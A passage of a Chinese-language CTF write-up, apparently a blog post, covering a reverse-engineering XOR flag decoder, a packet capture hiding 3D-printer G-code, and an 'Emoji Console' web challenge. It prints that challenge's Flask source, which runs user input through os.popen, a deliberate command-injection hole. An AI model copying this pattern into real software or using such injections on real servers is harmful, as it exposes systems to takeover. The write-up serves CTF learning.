class="symbol">.rodata:</span>00000000000020A8                 <span class="built_in">dd</span> <span class="number">1A003100h</span>, <span class="number">76180807h</span></span><br></pre></td></tr></table></figure><p>接下來，我們就只要照題目所做的把它 print 出來就行了(除了 sleep 跟 fflush 的部分)，exploit 腳本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">secret = [</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;F&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;K&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;E&quot;</span>),</span><br><span class="line">    <span class="number">0x0B</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;&#123;&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;h&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;o&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;o&quot;</span>),</span><br><span class="line">    <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x74</span>,</span><br><span class="line">    <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0x69</span>,</span><br><span class="line">    <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x69</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x6D</span>,</span><br><span class="line">    <span class="number">0x6D</span>,</span><br><span class="line">    <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x7D</span>,</span><br><span class="line">    <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">    <span class="number">0x3A011001</span>,</span><br><span class="line">    <span class="number">0x4C4C1B0D</span>,</span><br><span class="line">    <span class="number">0x3A0B002D</span>,</span><br><span class="line">    <span class="number">0x00454F40</span>,</span><br><span class="line">    <span class="number">0x3104321A</span>,</span><br><span class="line">    <span class="number">0x3E2D161D</span>,</span><br><span class="line">    <span class="number">0x2C120A31</span>,</span><br><span class="line">    <span class="number">0x0D3E1103</span>,</span><br><span class="line">    <span class="number">0x0C1A002C</span>,</span><br><span class="line">    <span class="number">0x041D1432</span>,</span><br><span class="line">    <span class="number">0x1A003100</span>,</span><br><span class="line">    <span class="number">0x76180807</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">        part1 = <span class="built_in">int</span>.from_bytes(secret[<span class="number">4</span> * i : <span class="number">4</span> * i + <span class="number">4</span>], byteorder=<span class="string">&quot;little&quot;</span>)  <span class="comment"># 小端序</span></span><br><span class="line">        index = <span class="built_in">int</span>.from_bytes(</span><br><span class="line">            secret[<span class="number">4</span> * i + <span class="number">4</span> : <span class="number">4</span> * i + <span class="number">8</span>], byteorder=<span class="string">&quot;little&quot;</span></span><br><span class="line">        )  <span class="comment"># 小端序</span></span><br><span class="line">        v4 = part1 ^ key[index]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            c = (v4 &gt;&gt; (<span class="number">8</span> * j)) &amp; <span class="number">0xFF</span></span><br><span class="line">            result += <span class="built_in">chr</span>(c)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decode())</span><br></pre></td></tr></table></figure><p>執行之後 flag 就被 print 出來啦！</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;You_are_the_master_of_time_management!!!!?&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn">Pwn</h1><p>因為 Pwn 的部分比較都只是看看題目然後沒有頭緒，或是有頭緒但是不知道該如何做起，再加上到了很晚才去碰 Pwn 的題目，所以就都比較沒有進展，就不寫出來了。</p><h1 id="Misc">Misc</h1><h2 id="Three-Dimensional-Secret">Three Dimensional Secret</h2><blockquote><p><em>封包分析</em></p></blockquote><p>這題給了一個<code>capture.pcapng</code>，所以我們先用 Wireshark 把檔案給打開來，看看他葫蘆裡賣的是甚麼藥。<img src="https://hackmd.io/_uploads/r1EEdx9VR.png" alt="image"><br>在圖片中我們可以看到超級多的 TCP 封包，我一開始還不太知道接下來該怎麼做，但我在翻了一下<a href="https://www.books.com.tw/products/0010884220">這本書</a>之後就找到解法了！</p><p>首先我們先對著這坨 TCP 封包點右鍵，會出現一個選項叫做 Follow，如圖:</p><p><img src="https://hackmd.io/_uploads/SJkMtl5NA.png" alt="Wireshark"></p><p>然後我們把它點下去，然後再選擇 TCP Stream，就可以看到 Wireshark 所解析出來的內容，如下:</p><p><img src="https://hackmd.io/_uploads/SkGcFx5N0.png" alt=""></p><p>因為之前忘記在哪裡刷提的時候有寫過類似的題目，所以我知道這串看不懂的字其實是一個叫做 Gcode 的東西，它是用來控制工業中的一些自動工具機的代碼。因為太長了，所以我只放一小部分在下面。Gcode 就長下面這樣。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="name">G0</span> X<span class="number">171.826</span> Y<span class="number">145.358</span></span><br><span class="line"><span class="name">G0</span> X<span class="number">171.773</span> Y<span class="number">144.928</span></span><br><span class="line"><span class="name">G0</span> X<span class="number">171.082</span> Y<span class="number">142.074</span></span><br><span class="line"><span class="name">G0</span> X<span class="number">171.877</span> Y<span class="number">141.336</span></span><br><span class="line"><span class="name">G0</span> X<span class="number">172.029</span> Y<span class="number">138.178</span></span><br><span class="line"><span class="name">G0</span> X<span class="number">172.802</span> Y<span class="number">136.983</span></span><br><span class="line">;TYPE:WALL-I<span class="symbol">NNER</span></span><br><span class="line"><span class="symbol">G1</span> F<span class="number">1500</span> E<span class="number">2061.27916</span></span><br><span class="line"><span class="name">G1</span> F<span class="number">21000</span> X<span class="number">173.166</span> Y<span class="number">136.922</span> E<span class="number">2061.89293</span></span><br><span class="line"><span class="name">G1</span> X<span class="number">173.47</span> Y<span class="number">136.79</span> E<span class="number">2062.44409</span></span><br><span class="line"><span class="name">G1</span> X<span class="number">173.747</span> Y<span class="number">136.571</span> E<span class="number">2063.03132</span></span><br><span class="line"><span class="name">G1</span> X<span class="number">173.95</span> Y<span class="number">136.281</span> E<span class="number">2063.62001</span></span><br><span class="line"><span class="name">G1</span> X<span class="number">174.046</span> Y<span class="number">135.929</span> E<span class="number">2064.22677</span></span><br><span class="line"><span class="name">G1</span> X<span class="number">174.043</span> Y<span class="number">135.473</span> E<span class="number">2064.98511</span></span><br></pre></td></tr></table></figure><p>既然已經知道了他是 Gcode，我們就趕快來找一個線上的 Viewer 來看看他生作圓還是扁吧！我使用的網站是<a href="https://ncviewer.com/">這個</a>。把那串代碼放上去後，就點一下圖中的 Plot 來看看！</p><p><img src="https://hackmd.io/_uploads/HJA09l9N0.png" alt=""></p><p>點下去後發現居然沒有東西，我直接愣在原地被硬控三秒鐘。難道是我想錯了嗎！！！在慌亂之中，我趕緊調整視角，終於發現了偷偷躲在旁邊的 Flag，如下:</p><p><img src="https://hackmd.io/_uploads/SyqholcNR.png" alt=""></p><p>(然後因為我偷懶+怕打錯字所以用了 OCR 把它的文字題取出來)</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;b4d1y_tun3d PriN73r&#125;</span><br></pre></td></tr></table></figure><h2 id="Emoji-Console">Emoji Console</h2><p>這題點進去後發現是長下面這樣，是由很多 Emoji 所組成的一個 Console，也難怪題目就叫這名字 XD。</p><p><img src="https://hackmd.io/_uploads/Hyj42rsEC.png" alt=""></p><p>在這邊，我嘗試點了一些不同的 emoji，發現會對應到右邊不同的字符，組成不同的命令，所以我先用了</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐱 ⭐</span><br></pre></td></tr></table></figure><p>把當前目錄下的所有東西都 cat 出來看看，果然看到了題目的腳本內容。如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, redirect, jsonify, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">command: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    emoji_table = json.load(<span class="built_in">open</span>(<span class="string">&quot;emoji.json&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> emoji_table:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> command:</span><br><span class="line">            command = command.replace(key, emoji_table[key])</span><br><span class="line">    <span class="keyword">return</span> command.lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    command = request.args.get(<span class="string">&quot;command&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(command).intersection(<span class="built_in">set</span>(string.printable.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)))) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;command&quot;</span>: command, <span class="string">&quot;result&quot;</span>: <span class="string">&quot;Invalid command&quot;</span>&#125;)</span><br><span class="line">    command = translate(command)</span><br><span class="line">    result = os.popen(command + <span class="string">&quot; 2&gt;&amp;1&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;command&quot;</span>: command, <span class="string">&quot;result&quot;</span>: result&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;😀&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😁&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😂&quot;</span>: <span class="string">&quot;:&#x27;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤣&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😃&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😄&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😅&quot;</span>: <span class="string">&quot;&#x27;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😆&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😉&quot;</span>: <span class="string">&quot;;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😊&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😋&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😎&quot;</span>: <span class="string">&quot;B)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😍&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😘&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😗&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😙&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😚&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☺️&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙂&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤗&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤩&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤔&quot;</span>: <span class="string">&quot;:?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤨&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😐&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😑&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😶&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙄&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😏&quot;</span>: <span class="string">&quot;:]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😣&quot;</span>: <span class="string">&quot;&gt;:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😥&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😮&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤐&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😯&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😪&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😫&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😴&quot;</span>: <span class="string">&quot;Zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😌&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😛&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😜&quot;</span>: <span class="string">&quot;;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😝&quot;</span>: <span class="string">&quot;XP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤤&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😒&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😓&quot;</span>: <span class="string">&quot;;/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😔&quot;</span>: <span 